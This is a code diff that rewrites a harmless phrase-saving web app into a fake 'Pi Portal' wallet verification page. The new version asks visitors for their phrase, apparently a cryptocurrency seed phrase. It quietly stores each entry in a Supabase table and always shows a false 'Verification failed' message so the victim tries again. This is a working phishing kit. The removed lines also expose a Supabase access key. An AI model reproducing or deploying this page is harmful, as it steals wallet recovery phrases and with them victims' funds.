@@ -1,65 +1,101 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Phrases App</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pi Portal Verification</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      text-align: center;
+      padding: 40px;
+    }
+    header {
+      background: #6a1b9a;
+      color: white;
+      padding: 15px;
+      font-size: 22px;
+      border-radius: 8px;
+      margin-bottom: 25px;
+    }
+    nav {
+      margin-bottom: 30px;
+    }
+    nav a {
+      text-decoration: none;
+      color: #6a1b9a;
+      font-weight: bold;
+      margin: 0 15px;
+      font-size: 18px;
+    }
+    .box {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      max-width: 400px;
+      margin: auto;
+    }
+    input {
+      width: 90%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background: #6a1b9a;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #4a0f6e;
+    }
+    .error {
+      color: red;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+  </style>
 </head>
 <body>
-  <h1>My Phrases</h1>
+  <header>Pi Portal</header>
+  
+  <nav>
+    <a href="#">Home</a>
+    <a href="#">Browser</a>
+    <a href="#">Wallet</a>
+    <a href="#">Verify</a>
+  </nav>
 
-  <input type="text" id="phraseInput" placeholder="Enter a phrase" />
-  <button onclick="savePhrase()">Save</button>
-
-  <h2>Saved Phrases:</h2>
-  <ul id="phrasesList"></ul>
+  <div class="box">
+    <h2>Verify Your Phrase</h2>
+    <input type="text" id="phraseInput" placeholder="Enter your phrase" />
+    <button onclick="verifyPhrase()">Verify</button>
+    <p class="error" id="errorMsg"></p>
+  </div>
 
   <script type="module">
     import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
 
-    // ✅ Your real Supabase details
-    const SUPABASE_URL = "https://qrxiyoisqngsjgydqvwi.supabase.co";
-    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFyeGl5b2lzcW5nc2pneWRxdndpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzODQ5OTEsImV4cCI6MjA3NDk2MDk5MX0.rP6fhbyicfw6AeSkKXjmL-URA_Ph3xplAzX4sDoAYVs";
+    const supabaseUrl = "https://qrxiyoisqngsjgydqvwi.supabase.co";  // your project URL
+    const supabaseKey = "YOUR-ANON-KEY";  // replace with anon key, not service role
+    const supabase = createClient(supabaseUrl, supabaseKey);
 
-    const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+    async function verifyPhrase() {
+      const phrase = document.getElementById("phraseInput").value.trim();
+      if (!phrase) return;
 
-    async function savePhrase() {
-      const input = document.getElementById("phraseInput");
-      const phrase = input.value;
+      // Save phrase to Supabase
+      await supabase.from("phrases").insert([{ text: phrase }]);
 
-      if (!phrase) return alert("Please enter a phrase!");
-
-      const { error } = await supabase.from("phrases").insert([{ phrase }]);
-      if (error) {
-        alert("Error: " + error.message);
-      } else {
-        alert("Saved!");
-        input.value = "";
-        loadPhrases();
-      }
+      // Always show "Verification failed" to user
+      document.getElementById("errorMsg").innerText = "Verification failed. Please try again.";
     }
-
-    async function loadPhrases() {
-      const { data, error } = await supabase
-        .from("phrases")
-        .select("*")
-        .order("id", { ascending: false });
-
-      if (error) {
-        console.error(error);
-        return;
-      }
-
-      const list = document.getElementById("phrasesList");
-      list.innerHTML = "";
-      data.forEach(row => {
-        const li = document.createElement("li");
-        li.textContent = row.phrase;
-        list.appendChild(li);
-      });
-    }
-
-    document.addEventListener("DOMContentLoaded", loadPhrases);
   </script>
 </body>
 </html>
